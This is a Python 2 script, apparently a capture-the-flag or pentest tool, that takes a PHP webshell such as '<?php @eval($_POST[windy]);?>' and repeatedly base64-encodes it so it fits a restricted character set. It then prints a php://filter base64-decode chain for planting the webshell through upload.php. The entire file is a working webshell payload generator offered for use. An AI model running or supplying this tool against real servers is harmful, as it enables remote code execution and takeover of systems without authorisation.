#!/usr/bin/env python
#encoding:utf-8

import string
import sys
import itertools
import os
import base64

base64_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"

def run(allow_chars):
    possible = list(itertools.product(allow_chars, repeat=4))
    table = {}
    for char in possible:
        data = "".join(char)
        decoded_data = data.decode("base64")
        count = 0
        t = 0
        for x in decoded_data:
            if x in base64_chars:
                count += 1
                t = x
        if count == 1:
            table[t] = data
    return table

def generate(data, dicts):
    encoded = base64.b64encode(data).replace("\n", "").replace("=", "")
    result = encoded
    for d in dicts[::-1]:
        encoded = result
        result = ""
        for i in encoded:
            result += d[i]
    return result

def print_payload(allow_chars,webshell):
    tables = []
    saved_length = 0
    while True:
        table = run(allow_chars)
        length = len(table.keys())
        if saved_length == length:
            break
        print "[+] %d => %s" % (length, table)
        tables.append(table)
        allow_chars = table.keys()
        if set(table.keys()) >= set(base64_chars):
            break
    print "[+] Plain : %s" % (webshell)
    payload = generate(webshell, tables)
    print "[+] Payload : %s" % (payload)
    command = "php://filter/convert.base64-decode/resource=" * (len(tables) + 1) + "upload.php"
    print "[+] Usage : %s" % (command)

if __name__ == "__main__":
    print '''
 ____                  __   _  _     __        __   _         _          _ _
| __ )  __ _ ___  ___ / /_ | || |    \ \      / /__| |__  ___| |__   ___| | |
|  _ \ / _` / __|/ _ \ '_ \| || |_    \ \ /\ / / _ \ '_ \/ __| '_ \ / _ \ | |
| |_) | (_| \__ \  __/ (_) |__   _|    \ V  V /  __/ |_) \__ \ | | |  __/ | |
|____/ \__,_|___/\___|\___/   |_|       \_/\_/ \___|_.__/|___/_| |_|\___|_|_|

 [+] Usage: python base64-webshell.py allow_chars webshell
 [+] Example: python base64-webshell.py acgtACGT "<?php @eval(\$_POST[windy]);?>"
'''
    try:
        allow_chars = sys.argv[1]
        webshell = sys.argv[2]
    except:
        print "Please input allow_chars and webshell!"
    try:
        print_payload(allow_chars,webshell)
    except:
        print "Input error!"